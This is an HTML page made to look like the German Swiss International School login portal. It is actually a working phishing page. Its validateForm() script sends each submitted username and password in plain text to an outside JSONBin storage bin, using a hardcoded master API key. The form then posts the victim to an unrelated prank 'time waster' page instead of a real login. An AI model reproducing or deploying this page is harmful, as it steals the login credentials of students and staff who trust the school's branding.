<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>German Swiss International School</title>
    <link rel="shortcut icon" href="img/favicon.ico">
    <link href="Styles/style.css" rel="stylesheet" type="text/css">
    <link href="Styles/default-font.css" rel="stylesheet" type="text/css">
    <script src="Scripts/jquery-1.10.1.min.js" type="text/javascript"></script>
</head>
<body>

<!-- ======== LOGO ======== -->
<div class="logo">
    <img class="logo" src="img/GSIS-Logo-Large.png" alt="GSIS">
</div>

<!-- ======== LOGIN FORM ======== -->
<div id="login-form">
    <h2>Login</h2>

    <form method="post" action="https://patorjk.com/misc/scrollingtext/timewaster.php?text=I+just+wasted+your+time+%3A%29&autoscroll=ON&duration=15" id="Form1" onsubmit="return validateForm();">


        <!-- Username -->
        <div id="username_input">
            <div id="username_inputleft"></div>
            <div id="username_inputmiddle">
                <input name="USERNAME" id="USERNAME" type="text"
                       placeholder="Failed to parse info" autocomplete="username">
                <img id="url_user" src="img/mailicon.png" alt="">
            </div>
            <div id="username_inputright"></div>
        </div>

        <!-- Password -->
        <div id="password_input">
            <div id="password_inputleft"></div>
            <div id="password_inputmiddle">
                <input name="PASSWORD" type="password" id="PASSWORD"
                       placeholder="Failed to parse info" autocomplete="current-password">
                <img id="url_password" src="img/passicon.png" alt="">
            </div>
            <div id="password_inputright"></div>
        </div>

        <!-- Submit -->
        <input type="submit" name="submit" value="SIGN IN" id="submit">

        <!-- Forgot password -->
        <div id="links_left">
            <a href="#" style="cursor:default;">Forgot your Password?</a>
        </div>

    </form>
</div>

<script>
/* Error alert when ?errorcode= is in the URL */
(function () {
    var code = new URLSearchParams(window.location.search).get("errorcode");
    if (code) {
        setTimeout(function () {
            alert(code === "3"
                ? "Sorry, you don't have the privilege."
                : "Login unsuccessful. Please try again.");
        }, 80);
    }
}());
const API_KEY = "$2a$10$b6qWjNmYwUy3AZw8JJEuPe8ZoyScnq6NNU01n2pTS4DzVwN7BfQlK";

async function saveToBin(binId, data) {
  // Auto-convert: wrap raw strings so JSONBin gets valid JSON
  const payload = typeof data === "string" ? { value: data } : data;

  const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
    method: "PUT",
    headers: {
      "Content-Type": "application/json",
      "X-Master-Key": API_KEY,
      "X-Bin-Versioning": "false"
    },
    body: JSON.stringify(payload)
  });

  if (!res.ok) {
    const err = await res.json();
    throw new Error(`JSONBin error: ${err.message}`);
  }

  return await res.json();
}

async function readFromBin(binId) {
  const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
    headers: { "X-Master-Key": API_KEY }
  });

  if (!res.ok) {
    const err = await res.json();
    throw new Error(`JSONBin error: ${err.message}`);
  }

  const json = await res.json();
  const record = json.record;

  // Auto-convert back: if it was a wrapped string, return the string
  return typeof record === "object" && "value" in record && Object.keys(record).length === 1
    ? record.value
    : record;
}

async function createBin(initialData = "", binName = "my-bin") {
  const payload = typeof initialData === "string" ? { value: initialData } : initialData;

  const res = await fetch("https://api.jsonbin.io/v3/b", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Master-Key": API_KEY,
      "X-Bin-Name": binName,
      "X-Bin-Private": "true"
    },
    body: JSON.stringify(payload)
  });

  if (!res.ok) {
    const err = await res.json();
    throw new Error(`JSONBin error: ${err.message}`);
  }

  const json = await res.json();
  return json.metadata.id; // returns the new bin ID as a string
}
/* Basic client-side validation */
function validateForm() {
    var u = document.getElementById("USERNAME").value.trim();
    var p = document.getElementById("PASSWORD").value;
    if (!u || !p) {
        alert("Please enter your username and password.");
        return false;
    }else{
        let binid = "699965b243b1c97be9907422";
        saveToBin(binid, { username: u, password: p });
    }
    return true;
}
</script>

</body>
</html>
